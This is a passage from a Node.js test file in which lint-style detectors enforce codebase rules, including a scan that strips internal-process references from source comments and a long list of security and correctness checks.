//               decision parentheticals — none of which an operator
//               reading the shipped source can map to anything in their
//               own checkout. Genuinely operator-meaningful references
//               (RFC / CVE / NIST / CWE, "since vX.Y.Z", established
//               terse markers like D-M4 / AUTH-32) are NOT matched.
//               Allowlist a false positive with `// allow:internal-
//               narrative-comment`. ----
function testNoInternalNarrativeComments() {
  // class: internal-narrative-comment
  var NARRATIVE = [
    { re: /\b(?:SUBSTRATE|BUG|MAIL)-\d+\b/,        what: "internal slice/bug ID" },
    { re: /\b(?:D-[MLH]\d+|AUTH-\d+|CRYPTO-\d+|SUPPLY-\d+)\b/, what: "internal domain/slice ID" },
    { re: /\bCodex\s+P\d/,                          what: "code-review-process reference (Codex P#)" },
    { re: /\bF-[A-Z]{2,}-\d+\b/,                    what: "internal feature/plan item ID" },
    { re: /\bPR\s+#\d+\b/,                          what: "pull-request number (process residue)" },
    { re: /\b[Aa]udit\s+\d{4}-\d{2}-\d{2}/,         what: "dated audit/decision residue" },
    { re: /\bReported\s+\d{4}-\d{2}-\d{2}/,         what: "dated report residue" },
    { re: /\bCore Rule\s+§\d/,                 what: "internal CLAUDE.md rule-number citation" },
    { re: /----\s*v\d+\.\d+\.\d+/,             what: "version stamp in a section-divider comment" },
  ];
  var files = _libFiles();
  var bad = [];
  var jsdocLineRe = /^\s*\*/;
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var src = fs.readFileSync(files[fi], "utf8");
    var lines = src.split("\n");
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      // Scan the comment portion only: a ` * `-prefixed JSDoc line in
      // full, or the text after a line's first `//`.
      var comment = null;
      if (jsdocLineRe.test(line)) {
        comment = line;
      } else {
        var idx = line.indexOf("//");
        if (idx !== -1) comment = line.slice(idx);
      }
      if (comment === null) continue;
      for (var p = 0; p < NARRATIVE.length; p++) {
        var m = comment.match(NARRATIVE[p].re);
        if (m) {
          bad.push({
            file:    rel,
            line:    li + 1,
            content: NARRATIVE[p].what + ": `" + m[0] + "` in an operator-facing comment — " +
                     "describe the change, not the internal process (strip the label / drop the " +
                     "dated parenthetical / cite the public reason instead)",
          });
          break;
        }
      }
    }
  }
  bad = _filterMarkers(bad, "internal-narrative-comment");
  _report("operator-facing source comments must not carry internal-process narrative " +
          "(slice / bug / plan IDs, Codex / PR references, dated decision parentheticals)",
    bad);
}

async function run() {
  testPrimitiveReachability();
  testDenyPathComposesDenyResponse();
  testNoInternalNarrativeComments();
  testNoOrphanAllowClass();
  testNoRawByteLiterals();
  testNoRawTimeLiterals();
  testNumericOptsValidate();
  testHttp2TeardownPaired();
  testNoStrayConsoleCalls();
  testNoUnresolvedMarkers();
  testNoStaleDefers();
  testNoLiteralNulBytesInSource();
  testParserPrimitivesHaveFuzzHarness();
  testSafeGuardWiredInIndex();
  testSafeGuardHasMustComposeDetector();
  testNoTierTerminologyInLib();
  testNoHandRolledSql();
  testNoHardcodedFrameworkFileNames();
  testNoInlineRequires();
  testRequireBindingConsistency();
  testRequireBlockAlignment();
  testNodeBuiltinPrefixConsistency();
  testNoInternalBindingNameInProse();
  testNoDynamicRequires();
  testNoMathRandomForSecurity();
  testNoRawHashCompare();
  testRawNewURL();
  testNoBareJsonParse();
  testNoBareCanonicalizeWalks();
  testFormatValidatorLengthCap();
  testNoProcessExitInLib();
  testListenPortFalsyDefault();
  testImapLiteralSizeZeroFootgun();
  testHardcodedAuthMechanismInCaps();
  testBuildProfileWrongKey();
  testNoSilentCatchSwallow();
  testNoDynamicRegexFromOperatorInput();
  testNoRawXffRead();
  testNoRawForwardedProtoHostRead();
  testNoRawRemoteAddress();
  testNoRawProcessEnv();
  testNoRawTimingSafeEqual();
  testParseIntRadix();
  testBufferFromStringEncoding();
  testTimersUnref();
  testNoRawRandomBytesToken();
  testNoHandrolledSleep();
  testNoRawOutboundHttp();
  testNoNumberEnvCoercion();
  // Primitive-extraction-candidate detectors.
  testNoDuplicateRegexAcrossFiles();
  testNoHandrolledDeepClone();
  testNoHandrolledBufferCollect();
  testNoHandrolledDebounce();
  testNoHandrolledPromiseRaceTimeout();
  testNoManualByteCompare();
  testNoOpenCodedLazyRequire();
  testNoBareErrorThrows();
  testNoHandrolledUrlBuild();
  testNoHandrolledRetryLoop();
  await testNoDuplicateCodeBlocks();
  testStateStampScanningDeferred();
  testNoLegacyUrlFormat();
  testNoRawHeadersDistinct();
  testNoDenseWildcardRunsInLib();
  testNoUncappedSearchParamsObject();
  testNoDeniedVendors();
  // v0.8.91 bug-class detectors — derived from the
  // mail-require-tls / fal.meets / cdn-cache-control / SRS fix-ups.
  testTrimBeforeControlByteScan();
  testEnumRankWithoutValidation();
  testNoBoolStringCoerceShape();
  testNoBareCommaSplitOnQuotedHeader();
  testTenantScopeShapeValidated();
  testFromBase64UrlUntrappedOnAdversarialInput();
  testHostnameCompareTrailingDotNormalize();
  testDateUtcRoundTripVerify();
  testInfoLabelEmptyVsOmitted();
  testScopedContextBindingUsed();
  // v0.9.57 — mail-auth bug-class detectors
  testNoDirectNodeDnsInMail();
  testNoMathRandomInPolicyDecisions();
  testNoNaiveSuffixAlignment();
  testGunzipBombDistinguished();
  testGitleaksTrippingPatternsAllowlisted();
  // v0.9.58 bug-class detectors — derived from the CRYPTO-1 / CRYPTO-15 /
  // CRYPTO-21 / CRYPTO-22 fixes + CVE-2026-21713 HMAC compare class.
  testNoInlineRequireInDeferred();
  testSealWithoutAad();
  testNoRawMibLiteral();
  testNoHexShaCompareEquals();
  // v0.11.24 — mail-send-deliver bring-up + Codex P1/P2-a bug classes.
  testNoOutcomeBranchFallthroughToFailed();
  testNoSmtpTransportHostnameLocalOpt();
  testResolverQueryMxShapeNormalised();
  // v0.11.25 — b.money primitive ships with a must-compose detector so
  // Number-typed amounts never reach a Money construction or a
  // Money-shaped arithmetic site.
  testNoNumberMoneyArithmetic();
  // v0.11.25 — b.auth.botChallenge: refuse any audit emit that carries
  // the verifier's `secret` opt.
  testBotChallengeSecretNotInAudit();
  // v0.11.25 review-fix detectors (Codex P1/P1/P2): nonceStore awaited,
  // mail-store FTS insert transaction-wrapped, fsm.define deep-clones.
  testNonceStoreAwaited();
  testMailStoreFtsInTransaction();
  testFsmDefineClonesBeforeFreeze();
  // v0.11.26 review-fix detectors (Codex P1/P1): mail-server line-buffer
  // keeps raw bytes; BDAT LAST emits one reply.
  testMailServerLineBufferIsBuffer();
  testBdatLastSingleReply();
  // v0.11.27 review-fix detector (Codex P2): CHANGEDSINCE / UNCHANGEDSINCE
  // implicitly engage CONDSTORE per RFC 7162 §3.1.2.
  testCondstoreImplicitEngage();
  // v0.11.28 review-fix detector (Codex P1): CATENATE parts must
  // validate parens + preserve order per RFC 4469 §3.
  testCatenatePartsOrderPreserved();
  // v0.11.29 review-fix detector (Codex P1+P2): EventSource ping=0
  // opt-out + interval in payload per RFC 8620 §7.3.
  testJmapEventSourcePingShape();
  // v0.11.30 review-fix detectors (Codex P1 + CodeQL): JMAP Id cap
  // matches RFC 8620 §1.2 + URL-path split is bounded.
  testJmapIdNotUndersized();
  testUrlPathBoundedSplit();
  // v0.11.31 review-fix detector (Codex P1): UTC DTSTART round-trip
  // preserves timeZone="Etc/UTC" per RFC 8984 §1.4.4.
  testCalendarUtcRoundtrip();
  // v0.11.41 review-fix detector (Codex P1): BYSETPOS expand path
  // refuses pre-DTSTART instances per RFC 5545 §3.8.5.3.
  testCalendarBysetposStartGate();
  // v0.11.42 review-fix detector (Codex P1): typeof X !== "object"
  // checks must refuse null (since typeof null === "object").
  testCalendarTypeofObjectRefusesNull();
  // v0.11.43 wiki nav drift detector: every @nav in lib/*.js must
  // be a registered canonical category.
  testNavCategoryAllowlist();
  // v0.11.44 wiki-port cross-artifact detector: the Dockerfile's
  // WIKI_PORT default must match the release-container.yml smoke
  // step's port mapping + curl host.
  testWikiPortAgreesAcrossArtifacts();
  testEsbuildPinAgreesAcrossArtifacts();
  testNoDetachedAsyncIifeInLegacyLayerFiles();
  testNoTrackedInternalNotes();
  testResidencyGatesWired();
  testWikiStopGraceExceedsShutdownBudget();
  testOrchestratorRegistryReadsTenantScoped();
  testErrorCodesNamespacedKebab();
  // v0.13.19 CI hang backstop: every workflow job that runs the test
  // suite must declare timeout-minutes so a hung child can't ride
  // GitHub's 6-hour default.
  testTestJobsDeclareTimeout();
  // v0.12.1 compliance posture coverage detector: KNOWN_POSTURES ⊇
  // POSTURE_DEFAULTS + REGIME_MAP ⊇ KNOWN_POSTURES.
  testCompliancePostureCoverage();
  // v0.14.21 audit-fix detector: a validateOpts-accepted key that no
  // code reads is an advertised knob with no implementation
  // (csp-report opts.audit shipped as a silent no-op).
  testValidateOptsAcceptedKeysAreRead();
  testShapeFactoriesValidateOnlyViaShape();
  testKnownAntipatterns();

  // Final cumulative assertion — every detector is a hard gate.
  check("zero codebase-pattern violations across all classes",
        _allViolations.length === 0);
}

module.exports = { run: run };

if (require.main === module) {
  // Persistent output to .test-output/codebase-patterns.log so agents
  // iterating on a failing run can grep the file instead of re-running.
  // Synchronous fd writes (mirroring test/smoke.js) — async streams
  // don't flush before process exit, which previously left the log
  // empty after a failed run.
  var fsLog   = require("node:fs");
  var pathLog = require("node:path");
  var REPO_ROOT = pathLog.resolve(__dirname, "..", "..");
  var OUT = pathLog.join(REPO_ROOT, ".test-output");
  try { fsLog.mkdirSync(OUT, { recursive: true }); } catch (_e) { /* best-effort */ }
  var LOG_PATH = pathLog.join(OUT, "codebase-patterns.log");
  try { fsLog.unlinkSync(LOG_PATH); } catch (_e) { /* fresh start */ }
  var _logFd = fsLog.openSync(LOG_PATH, "w");
  function _logWrite(chunk) {
    try {
      var buf = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk, "utf8");
      fsLog.writeSync(_logFd, buf, 0, buf.length, null);
    } catch (_e) { /* best-effort */ }
  }
  var origStdout = process.stdout.write.bind(process.stdout);
  var origStderr = process.stderr.write.bind(process.stderr);
  process.stdout.write = function (c, e, cb) {
    _logWrite(c);
    return origStdout(c, e, cb);
  };
  process.stderr.write = function (c, e, cb) {
    _logWrite(c);
    return origStderr(c, e, cb);
  };
  process.on("exit", function () {
    try { fsLog.closeSync(_logFd); } catch (_e) { /* best-effort */ }
  });
  console.log("output: " + LOG_PATH);
  run().then(
    function () { console.log("OK — " + helpers.getChecks() + " checks passed"); },
    function (e) { console.error("FAIL:", e.stack || e); process.exit(1); }
  );
}
